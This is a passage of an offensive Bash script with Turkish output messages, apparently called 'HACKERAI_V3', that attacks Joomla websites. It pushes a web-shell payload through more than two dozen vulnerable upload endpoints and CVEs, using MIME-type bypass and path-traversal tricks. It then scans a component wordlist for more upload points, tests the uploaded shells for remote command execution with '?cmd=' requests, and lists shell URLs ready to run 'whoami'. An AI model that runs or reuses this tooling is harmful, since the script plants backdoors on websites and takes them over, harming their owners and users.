if [ "$RESP" = "200" ]; then
    verify_upload "JCE Editor" "${TARGET}/images/${PAYLOAD_FILE}"
fi

# Method 11: Attachments 3.x
echo -e "  ${BLUE}[11/${UPLOAD_TOTAL}]${NC} Attachments 3.x deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_attachments/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "Attachments" "${TARGET}/images/attachments/${PAYLOAD_FILE}"
fi

# Method 12: Simple File Upload v1.3 (EDB-18287)
echo -e "  ${BLUE}[12/${UPLOAD_TOTAL}]${NC} Simple File Upload v1.3 deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_simplefileupload/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "SimpleFileUpload" "${TARGET}/images/simplefileupload/${PAYLOAD_FILE}"
fi

# Method 13: Sexy Contact Form - UploadHandler.php
echo -e "  ${BLUE}[13/${UPLOAD_TOTAL}]${NC} Sexy Contact Form deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_sexycontactform/UploadHandler.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "SexyContactForm" "${TARGET}/images/sexycontactform/${PAYLOAD_FILE}"
fi

# Method 14: com_collector (EDB-24228)
echo -e "  ${BLUE}[14/${UPLOAD_TOTAL}]${NC} com_collector deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_collector/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "com_collector" "${TARGET}/images/collector/${PAYLOAD_FILE}"
fi

# Method 15: GMapFP J3.5 (CVE-2020-23972 / EDB-49129)
echo -e "  ${BLUE}[15/${UPLOAD_TOTAL}]${NC} GMapFP deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_gmapfp/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "GMapFP" "${TARGET}/images/gmapfp/${PAYLOAD_FILE}"
fi

# Method 16: RSForm! Pro
echo -e "  ${BLUE}[16/${UPLOAD_TOTAL}]${NC} RSForm! Pro deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/index.php?option=com_rsform&task=ajaxUpload" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "RSForm!Pro" "${TARGET}/media/com_rsform/uploads/${PAYLOAD_FILE}"
fi

# Method 17: Phoca Download
echo -e "  ${BLUE}[17/${UPLOAD_TOTAL}]${NC} Phoca Download deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_phocadownload/controllers/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "PhocaDownload" "${TARGET}/images/phocadownload/${PAYLOAD_FILE}"
fi

# Method 18: Phoca Gallery
echo -e "  ${BLUE}[18/${UPLOAD_TOTAL}]${NC} Phoca Gallery deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_phocagallery/controllers/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "PhocaGallery" "${TARGET}/images/phocagallery/${PAYLOAD_FILE}"
fi

# Method 19: Docman
echo -e "  ${BLUE}[19/${UPLOAD_TOTAL}]${NC} Docman deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_docman/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "Docman" "${TARGET}/images/docman/${PAYLOAD_FILE}"
fi

# Method 20: Garys Cookbook
echo -e "  ${BLUE}[20/${UPLOAD_TOTAL}]${NC} Garys Cookbook deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "userfile=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_cookbook/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "GarysCookbook" "${TARGET}/images/stories/${PAYLOAD_FILE}"
fi

# Method 21: com_uploader - pjpeg bypass
echo -e "  ${BLUE}[21/${UPLOAD_TOTAL}]${NC} com_uploader (.pjpeg bypass) deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "userfile=@${PAYLOAD_PATH};type=image/pjpeg" \
    "${TARGET}/components/com_uploader/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "com_uploader" "${TARGET}/images/stories/${PAYLOAD_FILE}"
fi

# Method 22: Simple Photo Gallery - path traversal
echo -e "  ${BLUE}[22/${UPLOAD_TOTAL}]${NC} Simple Photo Gallery (path traversal) deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "image=@${PAYLOAD_PATH}" \
    -F "path=../../images/" \
    "${TARGET}/components/com_simplephoto/uploadFile.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "SimplePhoto" "${TARGET}/images/${PAYLOAD_FILE}"
fi

# Method 23: Fabrik
echo -e "  ${BLUE}[23/${UPLOAD_TOTAL}]${NC} Fabrik deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -F "file=@${PAYLOAD_PATH}" \
    "${TARGET}/components/com_fabrik/upload.php" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    verify_upload "Fabrik" "${TARGET}/images/${PAYLOAD_FILE}"
fi

# Method 24: CVE-2025-22213 - Media Manager API
echo -e "  ${BLUE}[24/${UPLOAD_TOTAL}]${NC} CVE-2025-22213 (Media Manager API) deneniyor..."
CSRF_TOKEN=$(curl -s --connect-timeout 10 --max-time 15 -c /tmp/joomla_cookie.txt \
    "${TARGET}/administrator/index.php" 2>/dev/null | grep -oP 'csrf-token" content="\K[^"]+' | head -1)
if [ -z "$CSRF_TOKEN" ]; then
    CSRF_TOKEN=$(curl -s --connect-timeout 10 --max-time 15 -c /tmp/joomla_cookie.txt \
        "${TARGET}/index.php?option=com_media&task=api.display" 2>/dev/null | grep -oP '"csrf\.token":"\K[^"]+' | head -1)
fi
if [ -n "$CSRF_TOKEN" ]; then
    RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
        -b /tmp/joomla_cookie.txt \
        -H "X-CSRF-Token: ${CSRF_TOKEN}" \
        -F "file=@${PAYLOAD_PATH}" \
        -F "path=/images" \
        -F "name=${PAYLOAD_FILE}" \
        "${TARGET}/index.php?option=com_media&task=api.files&format=json" 2>/dev/null)
    if [ "$RESP" = "200" ]; then
        verify_upload "CVE-2025-22213" "${TARGET}/images/${PAYLOAD_FILE}"
    fi
fi
rm -f /tmp/joomla_cookie.txt

# Method 25: CVE-2023-23752 - API webservice
echo -e "  ${BLUE}[25/${UPLOAD_TOTAL}]${NC} CVE-2023-23752 (API) deneniyor..."
RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 10 --max-time 20 \
    -H "Content-Type: multipart/form-data" \
    -F "file=@${PAYLOAD_PATH}" \
    -F "path=/images" \
    "${TARGET}/api/index.php/v1/media/files" 2>/dev/null)
if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
    verify_upload "CVE-2023-23752" "${TARGET}/images/${PAYLOAD_FILE}"
fi

# Method 26-35: Component wordlist taramasi
echo -e "  ${BLUE}[26-35/${UPLOAD_TOTAL}]${NC} Component wordlist taranıyor..."
SCAN_COUNT=0
UPLOAD_FOUND=0
for COMP in $COMPONENTS; do
    SCAN_COUNT=$((SCAN_COUNT + 1))
    if [ $UPLOAD_FOUND -ge 5 ]; then
        break
    fi
    if [ $SCAN_COUNT -gt 150 ]; then
        break
    fi
    if [ $((SCAN_COUNT % 20)) -eq 0 ]; then
        echo -ne "\r     -> $SCAN_COUNT component kontrol edildi..."
    fi
    # upload.php kontrol
    RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 \
        -F "file=@${PAYLOAD_PATH}" \
        "${TARGET}/components/com_${COMP}/upload.php" 2>/dev/null)
    if [ "$RESP" = "200" ]; then
        verify_upload "com_${COMP}/upload.php" "${TARGET}/components/com_${COMP}/uploads/${PAYLOAD_FILE}"
        UPLOAD_FOUND=$((UPLOAD_FOUND + 1))
    fi
done
echo -e "\r     -> $SCAN_COUNT component tarandi, $UPLOAD_FOUND yeni upload bulundu."

# Ozet
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║           YUKLEME SONUCLARI                     ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
echo ""

if [ ${#upload_success[@]} -eq 0 ]; then
    echo -e "  ${RED}[!]${NC} Hicbir yukleme basarili olmadi."
else
    echo -e "  ${GREEN}[✔]${NC} Toplam ${#upload_success[@]} basarili yukleme:"
    echo ""
    for entry in "${upload_success[@]}"; do
        IFS='|' read -r method url <<< "$entry"
        echo -e "    ${GREEN}[✔]${NC} $method -> $url"
    done
fi

# ──────────────────────────────────────────────────────────────
# FAZ 5: RCE / SQLi KONTROL
# ──────────────────────────────────────────────────────────────
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║         FAZ 5: RCE / SQLi KONTROL               ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
echo ""

RCE_FOUND=false
SQLI_FOUND=false

if [ ${#upload_success[@]} -gt 0 ]; then
    echo -e "  ${BLUE}[*]${NC} Yuklenen shell dosyalari test ediliyor..."
    for entry in "${upload_success[@]}"; do
        IFS='|' read -r method shell_url <<< "$entry"
        TEST_URL="${shell_url}?cmd=echo%20HACKERAI_V3_TEST"
        RESP=$(curl -s --connect-timeout 5 --max-time 10 "$TEST_URL" 2>/dev/null)
        if echo "$RESP" | grep -q "HACKERAI_V3_TEST"; then
            echo -e "    ${GREEN}[✔] RCE BASARILI${NC} -> $method @ $shell_url"
            RCE_FOUND=true
            RCE_SHELLS+=("$shell_url")
        fi
    done
fi

if [ "$RCE_FOUND" = false ]; then
    echo -e "    ${YELLOW}[-]${NC} Hicbir shell'de RCE dogrulanamadi."
fi

# ──────────────────────────────────────────────────────────────
# OZET RAPOR
# ──────────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║            TARAMA RAPORU OZETI                  ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${CYAN}Hedef:${NC} $TARGET"
echo -e "  ${CYAN}Joomla Tespiti:${NC} $DETECTED"
echo -e "  ${CYAN}Joomla Versiyonu:${NC} $VERSION"
echo -e "  ${CYAN}Guvenlik Aciklari:${NC} $VULN_COUNT adet"
echo -e "  ${CYAN}Basarili Yukleme:${NC} ${#upload_success[@]} adet (${upload_count} denemeden)"
echo -e "  ${CYAN}RCE Basarili:${NC} $RCE_FOUND"
echo -e "  ${CYAN}SQLi Tespiti:${NC} $SQLI_FOUND"
echo ""

if [ "$RCE_FOUND" = true ]; then
    echo -e "  ${RED}[!]${NC} RCE Shell'leri:"
    for shell in "${RCE_SHELLS[@]}"; do
        echo -e "    ${RED}→${NC} $shell?cmd=whoami"
    done
    echo ""
    echo -e "  ${YELLOW}[!]${NC} NOT: Shell dosyasi 'b0yner.txt' olarak yuklendi."
fi

echo ""
echo -e "  ${BLUE}[*]${NC} Islem tamamlandi: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# Temizlik
rm -f /tmp/joomla_cookie.txt "$PAYLOAD_PATH" 2>/dev/null

exit 0
